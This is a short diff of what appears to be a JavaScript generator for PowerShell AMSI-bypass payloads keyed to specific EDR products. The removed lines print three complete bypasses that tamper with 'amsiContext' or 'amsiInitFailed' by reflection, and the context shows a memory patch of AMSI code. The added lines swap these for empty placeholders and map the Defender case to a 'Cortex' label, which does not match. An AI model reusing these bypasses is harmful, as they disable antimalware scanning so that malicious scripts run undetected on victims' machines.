@@ -56,9 +56,9 @@ if ($s -eq 8) {
 } else {
     [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $emh, 3)
 }`;
-    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder) \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
-    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
-    const defenderPayload = `#Defender AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
+    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder)`;
+    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder)`;
+    const cortexPayload = `#Cortex AMSI Bypass (Placeholder)`;
 
     switch (edr) {
         case 'CrowdStrike':
@@ -68,7 +68,7 @@ if ($s -eq 8) {
         case 'SentinelOne':
             return sentinelOnePayload;
         case 'Defender':
-            return defenderPayload;
+            return cortexPayload;
         case 'Random':
         default:
             switch (randomInt(4)) {
